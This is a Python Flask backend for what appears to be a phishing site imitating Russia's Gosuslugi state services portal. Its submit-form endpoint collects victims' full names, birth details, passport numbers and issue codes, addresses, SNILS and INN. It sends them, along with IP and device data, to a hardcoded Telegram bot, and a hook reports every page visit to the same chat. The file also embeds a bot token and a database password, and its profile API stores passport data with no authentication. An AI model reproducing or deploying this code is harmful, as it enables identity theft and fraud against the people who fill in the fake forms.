import os
import random
import subprocess
import uuid
from datetime import datetime
from threading import Thread

import requests
from flask import Flask, render_template, send_from_directory, request, jsonify,session, redirect
from user_agents import parse

from db import db, User, AuthUrl, Profile

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://gen_user:ovLX1T)Hpg-5%3E_@null:5432/default_db'  # Укажите ваш URI для базы данных
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = os.environ.get('SECRET_KEY') or 'dev-secret-key'

db.init_app(app)

with app.app_context():
    db.create_all()  # Создает таблицы в базе данных
@app.route('/')
def index():
    return send_from_directory('templates', 'test.htm')

@app.route('/setup/')
def setup():
    return render_template('setup_new.html')

@app.route('/profile/personal/id-doc')
def id_doc():
    return send_from_directory('templates', 'pass_data.htm')


# Конфигурация Telegram бота
TELEGRAM_TOKEN = "7705002195:AAE_9eNFFfaRxhwV54OT-mtm01L5BgXh7V4"
TELEGRAM_CHAT_ID = "-1002557822121"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
CALLBACK_URL = "https://gepolis-gu-7624.twc1.net/callback"

def parse_user_agent(user_agent_str):
    """Анализируем User-Agent для получения детальной информации"""
    if not user_agent_str:
        return {}

    ua = parse(user_agent_str)
    return {
        'browser': f"{ua.browser.family} {ua.browser.version_string}",
        'os': f"{ua.os.family} {ua.os.version_string}",
        'device': f"{ua.device.family}",
        'is_mobile': ua.is_mobile,
        'is_tablet': ua.is_tablet,
        'is_pc': ua.is_pc,
        'is_bot': ua.is_bot
    }


def get_client_info(request):
    """Собираем полную информацию о клиенте"""
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in ip:
            ip = ip.split(',')[0].strip()

        user_agent = request.headers.get('User-Agent')
        ua_info = parse_user_agent(user_agent)

        return {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "network": {
                "ip": ip,
                "user_agent": user_agent,
                "accept_language": request.headers.get('Accept-Language'),
                "referrer": request.headers.get('Referer')
            },
            "device": {
                **ua_info,
                "screen_resolution": request.headers.get('X-Screen-Resolution'),
                "timezone": request.headers.get('X-Timezone'),
                "device_id": request.headers.get('X-Device-ID')
            }
        }
    except Exception as e:
        return {"error": str(e)}


def format_telegram_message(form_data, client_info):
    """Форматируем красивое сообщение для Telegram"""
    message = "🚀 <b>Новые данные с формы Госуслуг</b>\n\n"

    # Секция личных данных
    message += "👤 <b>Личные данные:</b>\n"
    message += f"  • Фамилия: {form_data.get('lastName', 'Не указано')}\n"
    message += f"  • Имя: {form_data.get('firstName', 'Не указано')}\n"
    message += f"  • Отчество: {form_data.get('middleName', 'Не указано')}\n"
    message += f"  • Дата рождения: {form_data.get('birthDate', 'Не указано')}\n"
    message += f"  • Место рождения: {form_data.get('birthPlace', 'Не указано')}\n\n"

    # Секция паспорта
    message += "📘 <b>Паспортные данные:</b>\n"
    message += f"  • Номер паспорта: {form_data.get('passportNumber', 'Не указано')}\n"
    message += f"  • Кем выдан: {form_data.get('passportIssued', 'Не указано')}\n"
    message += f"  • Код подразделения: {form_data.get('passportCode', 'Не указано')}\n"
    message += f"  • Дата выдачи: {form_data.get('passportDate', 'Не указано')}\n\n"

    # Секция адреса
    message += "🏠 <b>Адреса:</b>\n"
    message += f"  • Адрес регистрации: {form_data.get('registrationAddress', 'Не указано')}\n"
    message += f"  • Адрес проживания: {form_data.get('livingAddress', 'Не указано')}\n\n"

    # Секция документов
    message += "📄 <b>Документы:</b>\n"
    message += f"  • СНИЛС: {form_data.get('snilsNumber', 'Не указано')}\n"
    message += f"  • ИНН: {form_data.get('innNumber', 'Не указано')}\n\n"

    # Информация об устройстве
    message += "📱 <b>Информация об устройстве:</b>\n"
    message += f"  • Устройство: {client_info['device'].get('device', '')} "
    message += f"({'Мобильное' if client_info['device'].get('is_mobile') else 'Десктоп'})\n"
    message += f"  • ОС: {client_info['device'].get('os', '')}\n"
    message += f"  • Браузер: {client_info['device'].get('browser', '')}\n"
    if 'screen_resolution' in client_info['device']:
        message += f"  • Разрешение: {client_info['device']['screen_resolution']}\n"
    message += f"  • Часовой пояс: {client_info['device'].get('timezone', '')}\n"
    message += f"  • IP: {client_info['network'].get('ip', '')}\n"
    message += f"  • Время: {client_info['timestamp']}\n"

    return message


def format_visit_message(client_info, page):
    """Форматируем сообщение о посещении страницы"""
    message = "👀 <b>Новый посетитель на сайте</b>\n\n"
    message += f"📄 <b>Страница:</b> {page}\n\n"

    message += "📱 <b>Информация об устройстве:</b>\n"
    message += f"  • Устройство: {client_info['device'].get('device', '')} "
    message += f"({'Мобильное' if client_info['device'].get('is_mobile') else 'Десктоп'})\n"
    message += f"  • ОС: {client_info['device'].get('os', '')}\n"
    message += f"  • Браузер: {client_info['device'].get('browser', '')}\n"
    if 'screen_resolution' in client_info['device']:
        message += f"  • Разрешение: {client_info['device']['screen_resolution']}\n"
    message += f"  • Часовой пояс: {client_info['device'].get('timezone', '')}\n"
    message += f"  • IP: {client_info['network'].get('ip', '')}\n"
    message += f"  • Язык: {client_info['network'].get('accept_language', '')}\n"
    message += f"  • Реферер: {client_info['network'].get('referrer', 'Прямой заход')}\n"
    message += f"  • Время: {client_info['timestamp']}\n"

    return message


def send_to_telegram(message):
    """Отправляем сообщение в Telegram"""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False


@app.before_request
def track_visits():
    """Отслеживаем посещения основных страниц"""
    if request.path in ['/', '/setup/', '/profile/personal/id-doc']:
        client_info = get_client_info(request)
        message = format_visit_message(client_info, request.path)
        send_to_telegram(message)


def send_to_telegram(message):
    """Отправляем сообщение в Telegram"""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False


@app.route('/api/submit-form', methods=['POST'])
def submit_form():
    try:
        # Получаем данные формы
        form_data = request.json

        # Получаем информацию об устройстве
        client_info = get_client_info(request)

        # Формируем и отправляем сообщение
        message = format_telegram_message(form_data, client_info)
        if send_to_telegram(message):
            return jsonify({"status": "success"})
        return jsonify({"status": "error", "message": "Ошибка отправки"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route("/mobile")
def mobile():
    return render_template("pass_mobile.html")

@app.route("/mobile/details")
def mobile_details():
    return render_template("pass_mobile_detail.html")




@app.route('/gen_auth/<int:user_id>/<string:username>')
def gen_auth(user_id, username):
    otp_code = random.randint(100000, 999999)
    au = AuthUrl(code=str(otp_code), user_id=user_id, username=username)
    db.session.add(au)
    db.session.commit()
    return jsonify({'code': otp_code, 'user_id': user_id})


@app.route('/check_auth/<int:otp_code>')
def check_auth(otp_code):
    auth_url = AuthUrl.query.filter_by(code=otp_code, is_active=True).first()
    if auth_url:
        user = User.query.filter_by(user_id=auth_url.user_id).first()

        auth_url.is_active = False
        db.session.commit()
        if user:
            session['user_id'] = user.id
        else:
            user = User(
                user_id=auth_url.user_id,
                username=auth_url.username
            )
            db.session.add(user)
            db.session.commit()

        return jsonify({'status': 'success', 'user_id': user.id})
    else:
        return jsonify({'status': 'error'})

@app.route('/auth')
def auth():
    return render_template('auth.html')


@app.route('/api/user', methods=['GET'])
def get_or_create_user():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    return jsonify({
        'id': user.id,
        'user_id': user.user_id,
        'username': user.username,
        'is_admin': user.is_admin
    })


@app.route('/api/profiles', methods=['GET'])
def get_profiles():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    profiles = Profile.query.filter_by(user_id=user.id).all()
    if not profiles:
        return jsonify({'error': 'Profiles not found'}), 404

    return jsonify([profile.to_dict() for profile in profiles])


@app.route('/api/profile', methods=['GET'])
def get_profile():
    user_id = request.args.get('user_id')
    profile_id = request.args.get('profile_id')

    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    profile = Profile.query.filter_by(id=profile_id, user_id=user.id).first()
    if not profile:
        return jsonify({'error': 'Profile not found'}), 404

    return jsonify(profile.to_dict())


@app.route('/api/profile', methods=['POST'])
def create_profile():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    data = request.get_json()
    name = data.get('name', 'Новый профиль')
    is_primary = data.get('is_primary', False)

    # Проверка на существование основного профиля
    if is_primary:
        primary_profile = Profile.query.filter_by(user_id=user.id, is_primary=True).first()
        if primary_profile:
            return jsonify({'error': 'Primary profile already exists'}), 400

    new_profile = Profile(
        name=name,
        user_id=user.id,
        is_primary=is_primary,
        photo=data.get('photo'),
        last_name=data.get('last_name'),
        first_name=data.get('first_name'),
        middle_name=data.get('middle_name'),
        birth_date=data.get('birth_date'),
        birth_place=data.get('birth_place'),
        passport_number=data.get('passport_number'),
        passport_issued=data.get('passport_issued'),
        passport_code=data.get('passport_code'),
        passport_date=data.get('passport_date'),
        registration_address=data.get('registration_address'),
        living_address=data.get('living_address'),
        snils_number=data.get('snils_number'),
        inn_number=data.get('inn_number')
    )

    db.session.add(new_profile)
    db.session.commit()

    return jsonify(new_profile.to_dict()), 201


@app.route('/api/profile', methods=['PUT'])
def update_profile():
    user_id = request.args.get('user_id')
    profile_id = request.args.get('profile_id')

    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    profile = Profile.query.filter_by(id=profile_id, user_id=user.id).first()
    if not profile:
        return jsonify({'error': 'Profile not found'}), 404

    data = request.get_json()

    if 'name' in data:
        profile.name = data['name']
    if 'is_primary' in data:
        profile.is_primary = data['is_primary']
    if 'last_name' in data:
        profile.last_name = data['last_name']
    if 'first_name' in data:
        profile.first_name = data['first_name']
    if 'middle_name' in data:
        profile.middle_name = data['middle_name']
    if 'birth_date' in data:
        profile.birth_date = data['birth_date']
    if 'birth_place' in data:
        profile.birth_place = data['birth_place']
    if 'passport_number' in data:
        profile.passport_number = data['passport_number']
    if 'passport_issued' in data:
        profile.passport_issued = data['passport_issued']
    if 'passport_code' in data:
        profile.passport_code = data['passport_code']
    if 'passport_date' in data:
        profile.passport_date = data['passport_date']
    if 'registration_address' in data:
        profile.registration_address = data['registration_address']
    if 'living_address' in data:
        profile.living_address = data['living_address']
    if 'snils_number' in data:
        profile.snils_number = data['snils_number']
    if 'inn_number' in data:
        profile.inn_number = data['inn_number']
    if 'photo' in data:
        profile.photo = data['photo']

    db.session.commit()
    return jsonify(profile.to_dict())


@app.route('/api/profile', methods=['DELETE'])
def delete_profile():
    user_id = request.args.get('user_id')
    profile_id = request.args.get('profile_id')

    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    profile = Profile.query.filter_by(id=profile_id, user_id=user.id).first()
    if not profile:
        return jsonify({'error': 'Profile not found'}), 404

    db.session.delete(profile)
    db.session.commit()

    return jsonify({'message': 'Profile deleted successfully'})



app.run(host='0.0.0.0', port=5000)
